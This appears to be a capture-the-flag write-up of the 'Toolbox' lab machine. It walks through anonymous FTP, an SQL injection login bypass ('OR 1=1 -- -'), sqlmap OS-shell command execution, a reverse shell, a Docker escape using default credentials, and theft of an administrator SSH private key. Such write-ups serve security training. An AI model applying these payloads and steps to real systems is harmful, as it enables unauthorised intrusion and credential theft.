# Toolbox

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.96.171
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-07 06:28 EDT
Nmap scan report for 10.129.96.171
Host is up (0.0079s latency).
Not shown: 65521 closed tcp ports (conn-refused)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
443/tcp   open  https
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
```

### FTP Anonymous Access

We can login to FTP using `anonymous`, and find an `.exe` file:

```
$ ftp 10.129.96.171
Connected to 10.129.96.171.
220-FileZilla Server 0.9.60 beta
220-written by Tim Kosse (tim.kosse@filezilla-project.org)
220 Please visit https://filezilla-project.org/
Name (10.129.96.171:kali): anonymous
331 Password required for anonymous
Password: 
230 Logged on
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||50028|)
150 Opening data channel for directory listing of "/"
-r-xr-xr-x 1 ftp ftp      242520560 Feb 18  2020 docker-toolbox.exe
226 Successfully transferred "/"
```

I don't know what this is for, but we'll keep this in mind for now.

### MegaLogistics

The HTTPS page shows a freight corporate page:

<figure><img src="../../../.gitbook/assets/image (1888).png" alt=""><figcaption></figcaption></figure>

I took a look at the certificate, and found another subdomain.

<figure><img src="../../../.gitbook/assets/image (2501).png" alt=""><figcaption></figcaption></figure>

Heading to `admin.megalogistic.com` reveals a login page:

<figure><img src="../../../.gitbook/assets/image (498).png" alt=""><figcaption></figcaption></figure>

Sending a single `'` reveals an SQL error.

<figure><img src="../../../.gitbook/assets/image (3495).png" alt=""><figcaption></figcaption></figure>

So this is vulnerable to SQL Injection, and we can use `'OR 1=1 -- -` to bypass the login. On the admin dashboard, we see some stuff regarding credentials:

<figure><img src="../../../.gitbook/assets/image (2339).png" alt=""><figcaption></figcaption></figure>

There wasn't much within the administrator panel for us to use, so let's go back to the SQL Injection and see if we can get a webshell via `sqlmap`.&#x20;

```bash
$ sqlmap -r req --force-ssl --os-shell
os-shell> id
do you want to retrieve the command standard output? [Y/n/a] y
[06:37:40] [INFO] retrieved: 'uid=102(postgres) gid=104(postgres) groups=104(postgres),102...
command standard output: 'uid=102(postgres) gid=104(postgres) groups=104(postgres),102(ssl-cert)'
```

This works, and we can get a webshell. The weird part is, this is a Windows machine and I ran `id` out of instinct. This means that the website and database are probably run within a Docker container. Anyways, we can get a reverse shell via a `bash` one-liner.&#x20;

<figure><img src="../../../.gitbook/assets/image (2694).png" alt=""><figcaption></figcaption></figure>

I found the user flag within the `/var/lib/postgresql` folder:

<pre class="language-bash"><code class="lang-bash"><strong>$ find / -name 'user.txt' 2> /dev/null
</strong>/var/lib/postgresql/user.txt
</code></pre>

## Privilege Escalation

### Docker Escape

Earlier, we found that the administrator needs to send credentials to `tony` or something. Earlier, we found a `docker-toolbox.exe` file, and it is probably used to create this Docker.&#x20;

We can first figure out where other containers are located at via IP Address:

```
postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)
        RX packets 3305  bytes 322116 (314.5 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1839  bytes 3722336 (3.5 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 2042  bytes 635411 (620.5 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2042  bytes 635411 (620.5 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

I downloaded the `nmap` binary onto this machine via `curl`, and found that SSH was open on 172.17.0.1.&#x20;

```
postgres@bc56e3cc55e9:/tmp$ ./nmap 172.17.0.1

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-05-07 04:52 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.17.0.1
Host is up (0.00038s latency).
Not shown: 1205 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
443/tcp open  https
```

While Googling for `docker-toolbox` and `ssh`, I came across this StackOverflow question:

{% embed url="https://stackoverflow.com/questions/32027403/docker-toolbox-ssh-login" %}

I tried the password and username he specified (which looked default to me) and it worked:

<figure><img src="../../../.gitbook/assets/image (1654).png" alt=""><figcaption></figcaption></figure>

On the docker, we can run `sudo su` to become `root`.

```
docker@box:~$ sudo -l                                                          
User docker may run the following commands on this host:
    (root) NOPASSWD: ALL
docker@box:~$ sudo su                                                          
root@box:/home/docker# id
uid=0(root) gid=0(root) groups=0(root)
```

### SSH Creds

Within `/`, I found a `/c` directory:

```
root@box:/# ls -la                                                             
total 244
drwxr-xr-x   17 root     root           440 May  7 04:37 .
drwxr-xr-x   17 root     root           440 May  7 04:37 ..
drwxr-xr-x    2 root     root          1420 May  7 04:34 bin
drwxr-xr-x    3 root     root            60 May  7 04:37 c
```

This is likely the Windows machine file system being mounted, and since we are `root`, we can go ahead and enumerate it.&#x20;

```
root@box:/c/Users/Administrator# ls -la                                        
total 1501
drwxrwxrwx    1 docker   staff         8192 Feb  8  2021 .
dr-xr-xr-x    1 docker   staff         4096 Feb 19  2020 ..
drwxrwxrwx    1 docker   staff         4096 May  7 04:33 .VirtualBox
drwxrwxrwx    1 docker   staff            0 Feb 18  2020 .docker
drwxrwxrwx    1 docker   staff            0 Feb 19  2020 .ssh
```

Within the `.ssh` file, we can find an `id_rsa` private key. Using that, we can `ssh` in as `administrator` on the main machine.

<figure><img src="../../../.gitbook/assets/image (845).png" alt=""><figcaption></figcaption></figure>
